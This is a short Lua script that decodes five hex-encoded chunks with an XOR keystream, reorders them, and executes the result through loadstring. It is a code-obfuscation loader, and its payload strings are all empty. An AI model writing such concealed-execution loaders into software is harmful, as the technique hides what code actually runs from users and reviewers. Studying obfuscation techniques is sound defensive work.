-- V3
local C={}
C[1]=""
C[2]=""
C[3]=""
C[4]=""
C[5]=""
local KM={}
KM[1]={5291,5824,65521}
KM[2]={2563,1039,65517}
KM[3]={2663,2687,65521}
KM[4]={1111,1740,65521}
KM[5]={4105,5444,65503}
local CL={3000,3000,3000,3000,1861}
local NC=5
local PP,QQ,PI=2,1,3
local HB={}
for i=0,255 do HB[string.format('%02x',i)]=i end
local XT={}
for i=0,255 do
  local row={}
  for j=0,255 do
    local r,p=0,1
    local x,y=i,j
    while x>0 or y>0 do
      local xa,ya=x%2,y%2
      if xa~=ya then r=r+p end
      x=(x-xa)/2 y=(y-ya)/2 p=p*2
    end
    row[j]=r
  end
  XT[i]=row
end
local RES={}
for src=0,NC-1 do
  local pos=(((src-QQ)%NC)*PI)%NC
  local h=C[pos+1]
  local par=KM[pos+1]
  local A,B,M=par[1],par[2],par[3]
  local len=CL[pos+1]
  local out={}
  local cnt=0
  for i=1,len do
    local v=HB[h:sub(i*2-1,i*2)]
    local k=(((A*i+B)%M)%256)
    out[i]=string.char(XT[v][k])
  end
  RES[src+1]=table.concat(out)
end
local L1=table.concat(RES)
local f,e=loadstring(L1)
if not f then return end
return f()
